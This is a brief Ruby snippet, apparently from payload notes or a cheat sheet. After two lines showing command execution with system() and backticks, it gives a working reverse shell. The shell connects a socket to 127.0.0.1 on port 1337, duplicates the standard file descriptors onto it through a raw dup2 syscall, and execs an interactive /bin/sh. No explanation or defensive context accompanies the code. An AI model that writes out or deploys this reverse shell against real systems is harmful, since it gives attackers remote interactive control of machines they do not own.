system("touch hello.txt")
# or using backticks
`touch hello.txt`
require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 1337, '127.0.0.1'

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'
